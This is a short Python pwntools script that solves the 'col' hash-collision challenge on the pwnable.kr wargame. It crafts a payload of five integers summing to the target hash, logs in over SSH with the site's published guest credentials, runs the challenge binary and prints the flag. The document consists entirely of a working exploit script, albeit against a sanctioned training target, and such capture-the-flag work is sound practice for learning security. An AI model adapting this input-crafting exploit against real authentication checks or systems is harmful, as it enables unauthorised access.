from pwn import *

hashcode = 0x21DD09EC
half_value = int(hashcode/5)

payload = p32(half_value)+p32(half_value)+p32(half_value)+p32(half_value)+p32(half_value+4)

connection = ssh(user="col",host="pwnable.kr",port=2222,password="guest")

proc = connection.process(executable="/home/col/col",argv=["col",payload])
flag = str(proc.recvline().decode())
print(f"Flag: {flag}")
